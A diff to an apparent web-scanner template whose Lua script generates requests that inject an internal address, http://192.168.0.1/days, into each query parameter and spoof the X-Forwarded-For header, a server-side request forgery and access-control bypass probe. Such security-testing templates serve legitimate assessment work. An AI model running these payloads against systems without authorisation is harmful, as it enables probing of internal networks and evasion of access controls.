@@ -22,8 +22,32 @@ match:
 
 script:
   language: lua
-  entry: bypass
+  entry: run_batch
   source: |
-    function bypass(ctx)
-      return { url = "http://192.168.0.1/days" }
+    function run_batch(targets)
+        local results = {}
+        local payload_vector = "http://192.168.0.1/days"
+        local host_value = "192.168.0.1"
+        for _, target in ipairs(targets) do
+            local base_url = target.url
+            for _, param in ipairs(target.params) do
+                local new_url = base_url
+                if param.location == "Query" then
+                    local pattern = param.name .. "=[^&]*"
+                    local replacement = param.name .. "=" .. payload_vector
+                    if new_url:find(pattern) then
+                        new_url = new_url:gsub(pattern, replacement)
+                    else
+                        local sep = new_url:find("%?") and "&" or "?"
+                        new_url = new_url .. sep .. replacement
+                    end
+                end
+                table.insert(results, {
+                    url = new_url,
+                    method = target.method or "GET",
+                    headers = { ["X-Forwarded-For"] = host_value },
+                })
+            end
+        end
+        return results
     end
